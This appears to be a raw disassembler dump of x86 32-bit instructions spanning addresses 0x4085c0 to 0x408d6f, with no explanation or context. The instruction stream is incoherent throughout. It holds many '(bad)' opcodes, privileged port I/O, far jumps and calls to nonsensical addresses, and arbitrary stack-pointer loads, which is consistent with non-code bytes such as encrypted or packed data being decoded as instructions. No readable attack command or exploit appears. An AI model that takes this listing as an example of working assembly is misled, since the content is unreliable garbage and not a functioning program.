  4085c0:	xchg   al,ah
  4085c2:	add    eax,0xc066b814
  4085c7:	adc    edi,DWORD PTR [ebx-0x5f190c4e]
  4085cd:	jb     0x4085f1
  4085cf:	rcl    edx,0xd2
  4085d2:	push   es
  4085d3:	add    ebp,DWORD PTR [edx-0x32]
  4085d6:	int    0x48
  4085d8:	push   0xffffff9d
  4085da:	imul   eax,DWORD PTR [edi-0x7dc539c3],0x53004556
  4085e4:	outs   dx,BYTE PTR ds:[esi]
  4085e5:	push   cs
  4085e6:	sub    al,0xfb
  4085e8:	fsubr  DWORD PTR [edi-0x2b4c298a]
  4085ee:	push   edx
  4085ef:	pushf  
  4085f0:	je     0x408646
  4085f2:	popa   
  4085f3:	pushf  
  4085f4:	ins    BYTE PTR es:[edi],dx
  4085f5:	push   es
  4085f6:	and    edi,DWORD PTR [ebp+0x1671936a]
  4085fc:	addr16 push cs
  4085fe:	in     eax,0x7
  408600:	add    eax,0xa3ceb4c3
  408605:	push   0x1c3bb915
  40860a:	int    0xf6
  40860c:	lods   al,BYTE PTR ds:[esi]
  40860d:	xchg   esp,ebp
  40860f:	mov    cl,0x7d
  408611:	push   cs
  408612:	inc    edi
  408613:	call   0xd0e22aa9
  408618:	mov    esp,0x45fd4495
  40861d:	add    cl,BYTE PTR [ebx]
  40861f:	adc    ecx,DWORD PTR ds:0xb3b26168
  408625:	sub    DWORD PTR [ecx+edx*1],edi
  408628:	js     0x4085d4
  40862a:	add    BYTE PTR [esp+esi*2-0x7bad7604],0x8
  408632:	mov    bl,0x62
  408634:	adc    ebx,edx
  408636:	ror    BYTE PTR [edi+0x3ec58034],0x2f
  40863d:	cli    
  40863e:	test   BYTE PTR [esi],0xbd
  408641:	retf   
  408642:	push   0xffffffa7
  408644:	mov    esi,0xa7a80233
  408649:	retf   0x3b9e
  40864c:	shl    DWORD PTR [eax-0x30],1
  40864f:	push   eax
  408650:	out    dx,eax
  408651:	stos   BYTE PTR es:[edi],al
  408652:	xchg   esp,eax
  408653:	cmc    
  408654:	pop    esp
  408655:	jno    0x4086bc
  408657:	and    esp,ebx
  408659:	mov    bl,0x20
  40865b:	repz jg 0x40867e
  40865e:	mov    esp,0x1ab2700f
  408663:	loope  0x408651
  408665:	pop    eax
  408666:	pop    esp
  408667:	aaa    
  408668:	fistp  WORD PTR [eax-0x7a]
  40866b:	fisubr WORD PTR [edi-0xc]
  40866e:	dec    ebx
  40866f:	ins    DWORD PTR es:[edi],dx
  408670:	sahf   
  408671:	or     bh,BYTE PTR [ecx+0x4ac3fda9]
  408677:	(bad)  
  408678:	jl     0x4086a2
  40867a:	mov    bh,0x4c
  40867c:	sub    BYTE PTR gs:[ebp+eax*2-0xa],dh
  408681:	sbb    DWORD PTR [ebp-0x127defee],ebx
  408687:	fistp  WORD PTR [ebx+0x6e26203d]
  40868d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40868f:	sub    DWORD PTR [edx],ebp
  408691:	int3   
  408692:	sub    DWORD PTR [eax],ebp
  408694:	xchg   BYTE PTR [edi],dh
  408696:	pushf  
  408697:	xchg   ebp,eax
  408698:	sahf   
  408699:	mov    dh,0x73
  40869b:	(bad)  
  40869c:	sbb    eax,0x624f42a7
  4086a1:	sbb    edi,ebx
  4086a3:	xor    BYTE PTR es:[ebp+0x54edf65f],dh
  4086aa:	ins    BYTE PTR es:[edi],dx
  4086ab:	inc    edx
  4086ac:	push   edi
  4086ad:	das    
  4086ae:	out    0x9e,eax
  4086b0:	sub    esp,DWORD PTR [eax]
  4086b2:	or     BYTE PTR [esp+eax*8-0x698d8401],cl
  4086b9:	mov    DWORD PTR [ecx],esp
  4086bb:	sub    al,0xc8
  4086bd:	dec    ebp
  4086be:	mov    bl,0x48
  4086c0:	sti    
  4086c1:	or     ah,al
  4086c3:	pop    ds
  4086c4:	mov    eax,ds:0x883b733
  4086c9:	mov    ecx,0xdb32db23
  4086ce:	ss out dx,al
  4086d0:	sub    al,0xac
  4086d2:	xor    esi,DWORD PTR [ecx-0x6b]
  4086d5:	sbb    DWORD PTR [ebx-0x5f],0x74
  4086d9:	sub    ecx,DWORD PTR [esi-0x1fa7393c]
  4086df:	jnp    0x40872c
  4086e1:	mov    eax,ds:0x42268cd7
  4086e6:	in     al,dx
  4086e7:	or     DWORD PTR [ebp+0x58],0x24b50ff3
  4086ee:	nop
  4086ef:	mov    ebx,esp
  4086f1:	rcr    BYTE PTR [edx],0x22
  4086f4:	ja     0x40873a
  4086f6:	pop    ebx
  4086f7:	xor    al,0x23
  4086f9:	or     ch,BYTE PTR [edi-0x2c78f1c0]
  4086ff:	mov    ds:0xb9f3f791,eax
  408704:	push   ebp
  408705:	rcl    BYTE PTR [ecx],cl
  408707:	sahf   
  408708:	inc    edx
  408709:	mov    ecx,DWORD PTR [ecx+0x1e174919]
  40870f:	outs   dx,DWORD PTR ds:[esi]
  408710:	mov    al,ds:0x61be162a
  408715:	js     0x408726
  408717:	pop    ecx
  408718:	ja     0x408772
  40871a:	mov    bl,0x33
  40871c:	dec    eax
  40871d:	imul   edi,DWORD PTR [ebx-0x1],0xffffffa1
  408721:	inc    ebx
  408722:	mov    DWORD PTR [ecx-0x5d],esp
  408725:	jp     0x408708
  408727:	in     al,0xa
  408729:	mov    DWORD PTR [eax-0x73dee121],edx
  40872f:	fcomp  QWORD PTR [ebx+0x2e6ebcce]
  408735:	push   eax
  408736:	fwait
  408737:	cld    
  408738:	xor    al,0xc5
  40873a:	mov    ebp,0xf2cfef67
  40873f:	out    0xd0,eax
  408741:	xor    BYTE PTR [eax-0x40],0xa
  408745:	outs   dx,BYTE PTR ds:[esi]
  408746:	gs mov dh,0xbe
  408749:	mov    bl,0x60
  40874b:	mov    ah,bh
  40874d:	xchg   ecx,eax
  40874e:	in     al,dx
  40874f:	test   bl,dh
  408751:	leave  
  408752:	enter  0xfce1,0xa
  408756:	fsub   DWORD PTR [edx-0x6e107ce1]
  40875c:	shld   ebx,ebp,0x7
  408760:	pop    edi
  408761:	mov    ds:0xad156fa6,eax
  408766:	mov    DWORD PTR [eax-0x43],edx
  408769:	cmp    eax,0x2a973e1f
  40876e:	mov    edi,ebp
  408770:	push   es
  408771:	mov    dh,0xe3
  408773:	jae    0x4087c2
  408775:	gs and eax,0xd7206647
  40877b:	pop    ss
  40877c:	add    al,0xb5
  40877e:	adc    esi,DWORD PTR [ebp-0x5cbabdcc]
  408784:	sub    al,0x48
  408786:	icebp  
  408787:	xchg   esp,eax
  408788:	jnp    0x4087fc
  40878a:	jb     0x408737
  40878c:	int    0x62
  40878e:	mov    bl,0xfb
  408790:	jecxz  0x408728
  408792:	je     0x4087bf
  408794:	out    0x6c,al
  408796:	int3   
  408797:	inc    ecx
  408798:	shl    BYTE PTR [esi],cl
  40879a:	inc    eax
  40879b:	push   ds
  40879c:	push   ecx
  40879d:	or     BYTE PTR [edx+0x36],bl
  4087a0:	sub    ebp,eax
  4087a2:	cdq    
  4087a3:	push   edx
  4087a4:	loope  0x408811
  4087a6:	ret    
  4087a7:	sti    
  4087a8:	adc    eax,0x501f70d9
  4087ad:	jo     0x4087d6
  4087af:	int    0x6b
  4087b1:	pop    edi
  4087b2:	dec    esi
  4087b3:	sub    ch,BYTE PTR [edx+0x47]
  4087b6:	cmp    BYTE PTR [ebx-0x1d],bh
  4087b9:	ins    BYTE PTR es:[edi],dx
  4087ba:	adc    eax,0x9c315abc
  4087bf:	(bad)  
  4087c0:	cmp    DWORD PTR [edi-0xc],edx
  4087c3:	ret    0x6d43
  4087c6:	dec    edi
  4087c7:	es jnp 0x40882a
  4087ca:	xor    eax,0x9d2f5417
  4087cf:	mov    esp,DWORD PTR [ebx]
  4087d1:	call   0x20722a8b
  4087d6:	dec    ebp
  4087d7:	inc    esi
  4087d8:	jmp    0x5a9d1c55
  4087dd:	mov    esp,0x9bd30033
  4087e2:	(bad)  
  4087e3:	aas    
  4087e4:	push   ss
  4087e5:	jns    0x4087f9
  4087e7:	mov    edx,0xe4792cb3
  4087ec:	jl     0x40882f
  4087ee:	push   esi
  4087ef:	cli    
  4087f0:	mov    esp,0x3ccaef85
  4087f5:	adc    cl,BYTE PTR [edi+0x17c50228]
  4087fb:	in     eax,0x5e
  4087fd:	and    al,0xa1
  4087ff:	cmp    BYTE PTR [esi],al
  408801:	outs   dx,DWORD PTR ds:[esi]
  408802:	mov    edx,0x90aeb4b2
  408807:	in     al,0x2a
  408809:	stc    
  40880a:	jae    0x408828
  40880c:	xchg   ebx,eax
  40880d:	cld    
  40880e:	mov    ch,BYTE PTR [ecx-0x4537fbe8]
  408814:	sub    DWORD PTR [ebx],ecx
  408816:	jmp    0x4087dd
  408818:	xor    ah,BYTE PTR [ebx]
  40881a:	cmp    ah,0x1a
  40881d:	daa    
  40881e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881f:	or     ah,BYTE PTR [ecx-0xe8e1030]
  408825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408826:	push   esi
  408827:	data16 or dl,BYTE PTR [ebp+0x7c1ee15d]
  40882e:	dec    esp
  40882f:	push   ds
  408830:	loop   0x4087b8
  408832:	add    DWORD PTR [eax+0x42],0x44dbb837
  408839:	pop    esp
  40883a:	jecxz  0x4087eb
  40883c:	aad    0x13
  40883e:	mov    cl,0xa8
  408840:	xchg   DWORD PTR [ebx+ebx*1+0x1f],ebp
  408844:	(bad)  
  408845:	loope  0x40882e
  408847:	xor    DWORD PTR [ebp+0x68],ecx
  40884a:	xor    ebp,DWORD PTR [edx+0x16]
  40884d:	sub    edx,DWORD PTR ds:0x9d393e59
  408853:	cdq    
  408854:	adc    al,0xc9
  408856:	scas   al,BYTE PTR es:[edi]
  408857:	cdq    
  408858:	xor    bl,ah
  40885a:	stos   BYTE PTR es:[edi],al
  40885b:	mov    WORD PTR [esi+eiz*8],?
  40885e:	jle    0x4087e4
  408860:	int    0xa3
  408862:	retf   
  408863:	inc    esi
  408864:	xchg   esi,eax
  408865:	sub    BYTE PTR [ecx],0x13
  408868:	test   ebx,ebx
  40886a:	add    bl,ah
  40886c:	jmp    0x75538b84
  408871:	inc    esi
  408872:	outs   dx,BYTE PTR ds:[esi]
  408873:	pop    ecx
  408874:	fld    DWORD PTR [edx+edx*1+0x7]
  408878:	fwait
  408879:	and    DWORD PTR [edi-0x4c90392a],edi
  40887f:	pusha  
  408880:	lds    eax,FWORD PTR [eax]
  408882:	push   DWORD PTR [edi-0x35ebcbbd]
  408888:	mov    eax,ds:0x175eff58
  40888d:	popf   
  40888e:	retf   
  40888f:	repz mov eax,ds:0xaf819b6
  408895:	in     al,dx
  408896:	add    DWORD PTR [edx],0x7e
  408899:	jmp    0xe86:0xd43226fc
  4088a0:	arpl   WORD PTR [esi],di
  4088a2:	pop    esi
  4088a3:	cmp    al,0xd0
  4088a5:	xor    bl,al
  4088a7:	sbb    ebx,ebx
  4088a9:	xchg   ecx,ebp
  4088ab:	retf   
  4088ac:	nop
  4088ad:	jns    0x40883a
  4088af:	adc    eax,0xe560dbc7
  4088b4:	shl    al,cl
  4088b6:	ret    
  4088b7:	fcom   DWORD PTR [ebx-0x3]
  4088ba:	adc    edx,DWORD PTR [ecx+ebp*8+0x39c674c5]
  4088c1:	cld    
  4088c2:	adc    al,dl
  4088c4:	(bad)  
  4088c5:	lea    edx,[eax+0x25]
  4088c8:	and    ch,BYTE PTR [esi+eax*1-0x3b]
  4088cc:	xchg   edx,eax
  4088cd:	add    al,0x4b
  4088cf:	(bad)  
  4088d0:	hlt    
  4088d1:	rcl    BYTE PTR [eax+0x32af4f04],0x2c
  4088d8:	add    edi,DWORD PTR [esi+0x5ceb73ff]
  4088de:	popf   
  4088df:	test   ebp,ecx
  4088e1:	retf   0xf99f
  4088e4:	cmp    ebp,ecx
  4088e6:	lock lods eax,DWORD PTR ds:[esi]
  4088e8:	repnz push edi
  4088ea:	sbb    esp,DWORD PTR [ebp+edi*1+0x6e]
  4088ee:	xchg   esp,eax
  4088ef:	scas   eax,DWORD PTR es:[edi]
  4088f0:	cmp    DWORD PTR [ebx+0x3b69ca10],0xc69a5ff0
  4088fa:	nop
  4088fb:	mov    ch,0xb0
  4088fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088fe:	cmp    eax,0x72c9c23
  408903:	mov    al,ds:0x30b653d9
  408908:	and    bl,BYTE PTR [ebx-0x39db8b40]
  40890e:	jns    0x408906
  408910:	jo     0x408930
  408912:	fisubr DWORD PTR [ecx+edx*1-0x558d1a90]
  408919:	sbb    edx,esp
  40891b:	mov    ah,0xe7
  40891d:	(bad)  
  408920:	and    eax,0xfaea899c
  408925:	pop    esp
  408926:	cmp    al,0xb7
  408928:	(bad)  
  40892a:	cmc    
  40892b:	ror    esi,cl
  40892d:	push   ecx
  40892e:	dec    esp
  40892f:	shr    BYTE PTR ds:0xe35d9c49,1
  408935:	outs   dx,DWORD PTR ds:[esi]
  408936:	mov    bh,0x72
  408938:	pop    ds
  408939:	(bad)  
  40893a:	or     al,0xcf
  40893c:	jmp    0x40891b
  40893e:	bound  esi,QWORD PTR [edx+0xd]
  408941:	scas   al,BYTE PTR es:[edi]
  408942:	adc    dh,BYTE PTR [esi+0x68]
  408945:	push   ss
  408946:	pop    ecx
  408947:	mov    bh,0x2c
  408949:	test   eax,0xe92d3dfd
  40894e:	aas    
  40894f:	js     0x40899d
  408951:	jo     0x408941
  408953:	call   0x6846:0x6c243bb5
  40895a:	or     al,0xde
  40895c:	or     edi,DWORD PTR [edx-0x66650c46]
  408962:	hlt    
  408963:	push   edi
  408964:	push   ds
  408965:	or     DWORD PTR [esi-0x4b],0x27
  408969:	sqrtps xmm5,xmm5
  40896c:	or     ebx,ecx
  40896e:	cmp    bl,bl
  408970:	xlat   BYTE PTR ds:[ebx]
  408971:	call   0xc0ca63a
  408976:	int    0xef
  408978:	push   0x151dd17a
  40897d:	shr    BYTE PTR [ebp-0x6a],1
  408980:	pop    ss
  408981:	shl    DWORD PTR [eax],1
  408983:	mov    ebx,0xdda57e4b
  408988:	(bad)  
  408989:	(bad)  
  40898a:	cld    
  40898b:	cmp    eax,0x45d08d23
  408990:	mov    al,ds:0xbcb3ee19
  408995:	or     DWORD PTR [edi+eiz*4-0x135bf932],edx
  40899c:	imul   BYTE PTR gs:[eax-0x73452159]
  4089a3:	inc    ebx
  4089a4:	jo     0x4089e3
  4089a6:	mov    cl,BYTE PTR [ebx+0x5911fb57]
  4089ac:	mov    ds:0x632c222,al
  4089b1:	loopne 0x4089e1
  4089b3:	or     dh,dl
  4089b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089b6:	neg    BYTE PTR [eax-0x4]
  4089b9:	fisubr WORD PTR [ebx]
  4089bb:	sbb    esp,ebp
  4089bd:	out    dx,eax
  4089be:	xor    BYTE PTR [esi+0x1954d56d],ah
  4089c4:	or     DWORD PTR [ecx+ebx*2+0x12efdfdb],edx
  4089cb:	inc    bl
  4089cd:	mov    esi,0x8789d6b7
  4089d2:	push   ecx
  4089d3:	adc    eax,0xb19dfa65
  4089d8:	xchg   edi,eax
  4089d9:	iret   
  4089da:	fdiv   DWORD PTR [ebp-0x70]
  4089dd:	ret    0xca20
  4089e0:	cli    
  4089e1:	std    
  4089e2:	leave  
  4089e3:	cld    
  4089e4:	out    dx,eax
  4089e5:	test   eax,0xeea54dd5
  4089ea:	mov    esi,0x876bd314
  4089ef:	or     cl,BYTE PTR [ebx+0x2d]
  4089f2:	pop    esi
  4089f3:	xor    DWORD PTR ds:0x612ae6ea,esi
  4089f9:	xchg   DWORD PTR [esi],esi
  4089fb:	cli    
  4089fc:	xchg   edi,eax
  4089fd:	mov    es,ebx
  4089ff:	lock outs dx,DWORD PTR ds:[esi]
  408a01:	mov    esp,0x5115a79d
  408a06:	pop    eax
  408a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a08:	iret   
  408a09:	pop    ebx
  408a0a:	xlat   BYTE PTR ds:[ebx]
  408a0b:	je     0x408a78
  408a0d:	fstp   QWORD PTR [eax+0x5b3b0435]
  408a13:	cli    
  408a14:	sbb    DWORD PTR [ebp+0x6b],edi
  408a17:	push   edi
  408a18:	mov    eax,ds:0x858aeac1
  408a1d:	xor    al,0xac
  408a1f:	das    
  408a20:	cmp    al,0x5b
  408a22:	dec    ebx
  408a23:	das    
  408a24:	shl    BYTE PTR [edx],cl
  408a26:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a28:	sub    DWORD PTR [edx+0x6c],edi
  408a2b:	aam    0xda
  408a2d:	or     bh,ch
  408a2f:	call   0xdb6b:0xca5bf40c
  408a36:	push   ebp
  408a37:	or     BYTE PTR [ecx-0x37],0x8f
  408a3b:	rcl    BYTE PTR [ecx+esi*8+0x46bd87d0],1
  408a42:	jbe    0x4089f6
  408a44:	pop    edi
  408a45:	mov    eax,DWORD PTR [ecx+0x27]
  408a48:	ins    DWORD PTR es:[edi],dx
  408a49:	xchg   esp,eax
  408a4a:	mov    cs,WORD PTR [ebx]
  408a4c:	jecxz  0x408a94
  408a4e:	cmp    eax,0x4184de58
  408a53:	push   ecx
  408a54:	xor    al,0xd3
  408a56:	in     al,0x82
  408a58:	into   
  408a59:	adc    ecx,DWORD PTR [edx-0x26]
  408a5c:	pop    esi
  408a5d:	(bad)  
  408a5e:	fimul  DWORD PTR ds:0xc4c4fcfe
  408a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a65:	test   eax,0x1f7b551f
  408a6a:	call   0x4617dabf
  408a6f:	dec    esi
  408a70:	pop    ds
  408a71:	lahf   
  408a72:	pop    ebp
  408a73:	add    eax,0x3fd9ce29
  408a78:	push   0xffffffdc
  408a7a:	jbe    0x408a6b
  408a7c:	fstp   DWORD PTR [eax+0x58]
  408a7f:	jae    0x408a26
  408a81:	inc    ebp
  408a82:	xchg   edx,eax
  408a83:	or     BYTE PTR [ebp-0x13],dh
  408a86:	stos   DWORD PTR es:[edi],eax
  408a87:	jns    0x408a18
  408a89:	push   ebx
  408a8a:	fadd   st,st(5)
  408a8c:	(bad)  
  408a8d:	stc    
  408a8e:	and    bl,bh
  408a90:	jl     0x408a76
  408a92:	mov    al,ds:0xa50db865
  408a97:	mov    ch,0xa5
  408a99:	adc    al,BYTE PTR [edi]
  408a9b:	arpl   bx,di
  408a9d:	push   eax
  408a9e:	cmp    edi,edx
  408aa0:	cmp    al,BYTE PTR [eax+0x9355b29]
  408aa6:	pushf  
  408aa7:	test   BYTE PTR [esi+edx*8-0x57de144c],al
  408aae:	xor    BYTE PTR [eax],ah
  408ab0:	xlat   BYTE PTR ds:[ebx]
  408ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab2:	inc    esi
  408ab3:	fs mov bl,0x85
  408ab6:	push   edi
  408ab7:	mov    ch,0xff
  408ab9:	es cdq 
  408abb:	xchg   BYTE PTR [ebx+0x11],ch
  408abe:	cmp    esp,DWORD PTR [ebx+esi*2]
  408ac1:	pop    ds
  408ac2:	push   0xc1038ea4
  408ac7:	sbb    eax,0xa3a7f174
  408acc:	and    edi,DWORD PTR [edi-0x3ff28e08]
  408ad2:	jg     0x408b50
  408ad4:	and    al,0xf2
  408ad6:	sar    DWORD PTR [ebx],cl
  408ad8:	hlt    
  408ad9:	mov    eax,ds:0x89cdf7
  408ade:	into   
  408adf:	es jge 0x408af4
  408ae2:	push   ecx
  408ae3:	and    esi,esi
  408ae5:	inc    edi
  408ae6:	icebp  
  408ae7:	(bad)  
  408ae8:	mov    eax,ds:0x82c9395c
  408aed:	jno    0x408b23
  408aef:	adc    DWORD PTR fs:[ecx],esp
  408af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408af3:	mov    bh,BYTE PTR [ecx]
  408af5:	sti    
  408af6:	inc    esp
  408af7:	mov    ah,0x9d
  408af9:	dec    edx
  408afa:	mov    edx,0xc8ed7b18
  408aff:	out    dx,al
  408b00:	sbb    eax,0x3bd68c10
  408b05:	or     eax,0x8c69bde2
  408b0a:	popf   
  408b0b:	popa   
  408b0c:	stos   DWORD PTR es:[edi],eax
  408b0d:	cmp    dh,ah
  408b0f:	cmc    
  408b10:	sahf   
  408b11:	je     0x408b62
  408b13:	add    DWORD PTR [ebx+edi*4+0x4186ad8e],edi
  408b1a:	push   ebp
  408b1b:	lock aas 
  408b1d:	or     bl,BYTE PTR [ecx]
  408b1f:	or     al,0x17
  408b21:	add    ecx,DWORD PTR [ebx+ecx*8]
  408b24:	xor    edx,DWORD PTR [eax-0xc1bce96]
  408b2a:	xor    BYTE PTR [ecx-0x8],al
  408b2d:	xchg   BYTE PTR [eax],ch
  408b2f:	das    
  408b30:	adc    BYTE PTR [edi+0x6870dbbd],0x18
  408b37:	pop    ebx
  408b38:	aad    0x47
  408b3a:	jmp    0xaf55:0xf6b312b4
  408b41:	mov    edi,0x60aee836
  408b46:	outs   dx,BYTE PTR ds:[esi]
  408b47:	addr16 xchg ebp,esp
  408b4a:	loop   0x408b0a
  408b4c:	fwait
  408b4d:	daa    
  408b4e:	lods   eax,DWORD PTR ds:[esi]
  408b4f:	push   es
  408b50:	xchg   DWORD PTR [edx-0x12],ebp
  408b53:	enter  0xb20c,0xba
  408b57:	cmp    al,0xd9
  408b59:	dec    edx
  408b5a:	xchg   esp,eax
  408b5b:	popw   ss
  408b5d:	mov    ds:0x9a14f7fa,al
  408b62:	scas   eax,DWORD PTR es:[edi]
  408b63:	add    DWORD PTR [eax+0x2e344b4a],ecx
  408b69:	mov    esi,0x9120d7c4
  408b6e:	(bad)  
  408b6f:	jae    0x408b1c
  408b71:	das    
  408b72:	mov    ch,BYTE PTR [edx]
  408b74:	pop    edi
  408b75:	je     0x408b83
  408b77:	mov    edi,DWORD PTR [ebx+ebp*2-0x7c113b26]
  408b7e:	mov    ebp,0xda6ac2b4
  408b83:	add    al,0x25
  408b85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b86:	jb     0x408bfe
  408b88:	(bad)
  408b8c:	out    dx,eax
  408b8d:	or     BYTE PTR [esi-0x1],0x6c
  408b91:	(bad)  
  408b92:	dec    edi
  408b93:	setge  BYTE PTR [esi-0xbe540ec]
  408b9a:	inc    edx
  408b9b:	fs in  al,dx
  408b9d:	aas    
  408b9e:	cli    
  408b9f:	jbe    0x408bca
  408ba1:	mov    ds:0x5d84a238,eax
  408ba6:	nop
  408ba7:	std    
  408ba8:	scas   al,BYTE PTR es:[edi]
  408ba9:	inc    ebx
  408baa:	inc    ebp
  408bab:	dec    ebx
  408bac:	int    0xac
  408bae:	stc    
  408baf:	push   0x51
  408bb1:	rcl    DWORD PTR [esi-0x48],1
  408bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb5:	fyl2xp1 
  408bb7:	stos   DWORD PTR es:[edi],eax
  408bb8:	pop    ecx
  408bb9:	lahf   
  408bba:	cld    
  408bbb:	or     eax,DWORD PTR [edx-0x5515a8c0]
  408bc1:	jno    0x408ba0
  408bc3:	cmp    dl,BYTE PTR [esp+edi*8]
  408bc6:	je     0x408b83
  408bc8:	mov    edx,0x2c833f31
  408bcd:	and    DWORD PTR ss:[eax],esp
  408bd0:	nop
  408bd1:	push   0x7ad1d4fd
  408bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd7:	dec    edx
  408bd8:	sub    eax,0x34ce743a
  408bdd:	ret    0x1491
  408be0:	loopne 0x408b6f
  408be2:	push   esi
  408be3:	(bad)  
  408be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408be5:	xchg   esp,eax
  408be6:	pop    edx
  408be7:	inc    esp
  408be8:	inc    eax
  408bea:	lods   al,BYTE PTR ds:[esi]
  408beb:	(bad)  
  408bec:	push   0xffffff98
  408bee:	mov    bl,0x9c
  408bf0:	xchg   edx,eax
  408bf1:	in     al,0x43
  408bf3:	not    BYTE PTR [edi]
  408bf5:	dec    eax
  408bf6:	push   ebp
  408bf7:	(bad)  
  408bf9:	lea    ebx,[edi+esi*4]
  408bfc:	int    0xd7
  408bfe:	push   edi
  408bff:	push   ebp
  408c00:	cli    
  408c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c02:	jbe    0x408c5b
  408c04:	rol    BYTE PTR [ecx-0x4c73d57e],0x93
  408c0b:	mov    DWORD PTR [eax-0x4f0ce62d],edi
  408c11:	jmp    0x16e0:0xe7581ee6
  408c18:	adc    BYTE PTR [eax],bh
  408c1a:	iret   
  408c1b:	repz hlt 
  408c1d:	jp     0x408bb9
  408c1f:	lods   eax,DWORD PTR ds:[esi]
  408c20:	inc    esi
  408c21:	mov    WORD PTR [edx+edx*2+0x59],cs
  408c25:	cmp    eax,0x19096ccd
  408c2a:	and    al,0x34
  408c2c:	nop
  408c2d:	mov    ebx,0xb8753026
  408c32:	mov    dl,0x83
  408c34:	fdiv   DWORD PTR [ecx+ebp*2+0x8]
  408c38:	cdq    
  408c39:	leave  
  408c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3b:	fistp  QWORD PTR [ecx-0x3f]
  408c3e:	stos   BYTE PTR es:[edi],al
  408c3f:	loopne 0x408c55
  408c41:	das    
  408c42:	or     eax,0x14a731f2
  408c47:	jb     0x408c6b
  408c49:	(bad)  
  408c4a:	stc    
  408c4b:	or     al,ch
  408c4d:	or     eax,0x1f7e387a
  408c52:	loope  0x408ca6
  408c54:	dec    ebx
  408c55:	not    BYTE PTR [ecx]
  408c57:	cmp    al,0x78
  408c59:	jb     0x408c3a
  408c5b:	add    eax,0x3b5435e0
  408c60:	xchg   edx,eax
  408c61:	mov    ch,0x9c
  408c63:	push   ecx
  408c64:	loope  0x408c28
  408c66:	into   
  408c67:	xchg   edx,eax
  408c68:	cmp    eax,0x68d4322a
  408c6d:	and    BYTE PTR [ecx],cl
  408c6f:	les    edi,FWORD PTR [eax+0x43]
  408c72:	aad    0x6b
  408c74:	fs aaa 
  408c76:	pushf  
  408c77:	and    DWORD PTR ds:0x5c2350f5,eax
  408c7d:	test   DWORD PTR [edx-0x34],esp
  408c80:	sub    eax,0x630c7c6c
  408c85:	sub    ch,bh
  408c87:	pop    esp
  408c88:	mov    ds:0x148868f8,eax
  408c8d:	mov    ah,0x5b
  408c8f:	ins    BYTE PTR es:[edi],dx
  408c90:	jno    0x408c27
  408c92:	inc    esi
  408c93:	test   DWORD PTR [eax-0x3a],ebp
  408c96:	test   DWORD PTR [ebx],edx
  408c98:	cld    
  408c99:	outs   dx,BYTE PTR ds:[esi]
  408c9a:	icebp  
  408c9b:	movhps xmm3,QWORD PTR [esi-0x6a7a8fa4]
  408ca2:	push   edx
  408ca3:	jbe    0x408ce4
  408ca5:	test   ebp,esi
  408ca7:	aad    0x8a
  408ca9:	rol    BYTE PTR [edi+0x3f5ab3d7],1
  408caf:	mov    DWORD PTR [edi+0x2b],esi
  408cb2:	popf   
  408cb3:	xor    al,0x91
  408cb5:	xchg   ecx,eax
  408cb6:	ret    0x2842
  408cb9:	cmc    
  408cba:	dec    esi
  408cbb:	sbb    bh,bl
  408cbd:	cs stos BYTE PTR es:[edi],al
  408cbf:	add    eax,0xd21c21e0
  408cc4:	xchg   ebx,eax
  408cc5:	int3   
  408cc6:	jns    0x408d11
  408cc8:	mov    ch,0x95
  408cca:	push   cs
  408ccb:	fdiv   DWORD PTR [ebp-0x40b3f4b]
  408cd1:	add    edi,DWORD PTR [eax-0x61774cc8]
  408cd7:	rol    DWORD PTR [ebx],0x2
  408cda:	pop    ss
  408cdb:	xor    al,0x46
  408cdd:	mov    edx,0xfb2f9bcc
  408ce2:	aaa    
  408ce3:	cli    
  408ce4:	mov    ebx,0x458228ec
  408ce9:	(bad)  
  408cea:	sbb    esi,edi
  408cec:	fnstsw WORD PTR [edx+0x5f]
  408cef:	pop    ds
  408cf0:	ret    
  408cf1:	add    ebx,esp
  408cf3:	xor    cl,BYTE PTR [edi+0x35cbf7dd]
  408cf9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cfb:	in     eax,0xe6
  408cfd:	add    DWORD PTR [eax-0x17],ecx
  408d00:	sub    bl,cl
  408d02:	jne    0x408cd3
  408d04:	sub    al,0xba
  408d06:	stos   DWORD PTR es:[edi],eax
  408d07:	push   eax
  408d08:	in     eax,0xa4
  408d0a:	dec    ecx
  408d0b:	adc    ecx,ecx
  408d0d:	ret    0xe7f8
  408d10:	or     eax,0x1e60cc9a
  408d15:	add    ebx,eax
  408d17:	push   eax
  408d18:	sub    dl,BYTE PTR [esi-0x58]
  408d1b:	sub    eax,0x2e80f163
  408d20:	lds    ebx,FWORD PTR [eax+0x41]
  408d23:	in     eax,0x79
  408d25:	or     al,BYTE PTR ds:0x89c674d7
  408d2b:	das    
  408d2c:	(bad)  
  408d2d:	int    0x1d
  408d2f:	dec    eax
  408d30:	add    eax,0xdea50162
  408d35:	xchg   ebx,eax
  408d36:	sti    
  408d37:	add    BYTE PTR [edi-0x32],al
  408d3a:	add    eax,0xc985878e
  408d3f:	cmp    ecx,DWORD PTR [ebp-0x11]
  408d42:	xor    BYTE PTR [edi+0x65feb42d],dh
  408d48:	adc    DWORD PTR [esi],0x520e0239
  408d4e:	(bad)  
  408d4f:	clc    
  408d50:	and    al,0x2e
  408d52:	mov    eax,ds:0x2396c168
  408d57:	fmul   QWORD PTR [edi-0x5233de8c]
  408d5d:	out    0xd2,al
  408d5f:	fstp   st(1)
  408d61:	test   BYTE PTR [edi+0x36f2506c],bl
  408d67:	mov    ch,0xd5
  408d69:	(bad)  
  408d6a:	fistp  WORD PTR [edi]
  408d6c:	pop    eax
  408d6d:	mov    ah,0x6
  408d6f:	push   ss
